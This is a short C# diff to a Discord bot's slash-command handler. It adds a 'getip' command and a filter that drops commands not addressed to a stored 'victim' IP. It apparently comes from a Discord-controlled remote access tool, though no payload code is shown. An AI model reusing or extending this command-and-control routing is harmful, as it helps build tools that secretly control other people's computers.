@@ -8,6 +8,14 @@ internal partial class Handlers
 {
     internal static async Task SlashComamndReceived(SocketSlashCommand cmdSocket)
     {
+        if (cmdSocket.Data.Name == "getip")
+        {
+            await Commands.GetIp(cmdSocket);
+            return;
+        }
+        if (cmdSocket.Data.Options.ElementAt(0)?.Value.ToString() != VictimInformation.Shared.ip.ToString()!)
+            return;
+
         AnsiConsole.MarkupLine($"[cyan]Command Executed[/]: [red bold underline]{cmdSocket.Data.Name}[/]!");
 
         switch (cmdSocket.Data.Name)
